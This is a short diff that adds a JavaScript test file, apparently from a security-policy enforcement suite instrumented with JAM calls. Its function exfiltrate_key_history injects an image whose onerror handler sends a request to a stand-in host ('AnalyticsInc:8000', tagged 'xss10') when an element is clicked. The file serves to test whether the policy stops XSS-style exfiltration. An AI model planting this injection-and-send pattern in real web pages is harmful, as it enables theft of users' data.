@@ -1,0 +1,5 @@
+
+JAM.startProfile('load');
+function exfiltrate_key_history(){var URL=JAM.call(Function,null,['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss10",true);xmlhttp.send(null);']),script=document.createElement("img");script.src="/";JAM.set(script,"onerror",URL);URL=document.getElementsByTagName("body");introspect(JAM.policy.p1)URL=URL[0];JAM.call(URL.appendChild,URL,[script])}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history)
+
+JAM.stopProfile('load');
